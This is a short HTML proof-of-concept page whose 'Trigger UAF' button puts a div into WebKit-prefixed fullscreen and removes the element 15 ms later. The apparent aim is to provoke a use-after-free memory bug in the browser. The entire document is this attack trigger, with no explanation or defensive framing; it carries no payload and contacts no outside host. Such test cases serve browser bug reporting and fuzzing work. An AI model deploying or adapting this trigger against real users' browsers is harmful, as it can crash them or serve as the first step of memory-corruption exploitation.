<!DOCTYPE html>
<html>
<body>
    <button onclick="triggerUAF()">Trigger UAF</button><br><br>    
    <div id="target_div" style="width:100px;height:100px;background:red"></div>
    <script>
        function triggerUAF() {
            var div = document.getElementById("target_div");                      
            div.webkitRequestFullscreen();          
            setTimeout(() => {
                div.remove();
            }, 15); 
           
        }
    </script>
</body>
</html>
